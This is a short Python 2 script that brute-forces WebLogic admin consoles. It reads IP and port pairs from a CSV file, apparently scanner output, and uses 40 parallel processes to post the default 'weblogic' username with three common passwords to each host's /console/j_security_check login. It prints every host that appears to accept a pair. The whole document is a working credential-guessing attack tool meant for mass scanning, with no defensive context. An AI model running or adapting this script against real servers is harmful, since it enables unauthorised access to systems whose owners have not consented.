#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'JeeWin'


import requests as req
import sys
from multiprocessing import Pool
import re

def brute_force(ip_port):
    unames = ['weblogic']
    pwds = ['weblogic', 'weblogic123', 'weblogic1']
    url = 'http://' + ip_port[0] + ':' + ip_port[1] + '/console/j_security_check'

    #print url,
    for uname in unames:
        for pwd in pwds:
            try:
                print url
                payload = {'j_username': uname, 'j_password': pwd}
                s = req.Session()
                r = s.post(url, data=payload, timeout=5)

                if re.search('domain', r.text):
                    print "%s: %s/%s" % (url, uname, pwd)
            except Exception, e:
                print e


if __name__ == '__main__':

    urls = []
    #urls.append(['10.223.57.108','7002'])

    for line in open(sys.argv[1]):
        line = line.strip('\n')
        if not line.split(',')[0] == "saddr":
            ip = line.split(',')[0]
            urls.append([ip, line.split(',')[1]])

    #print urls
    pool = Pool(40)
    pool.map(brute_force, urls)
    pool.close()
    pool.join()




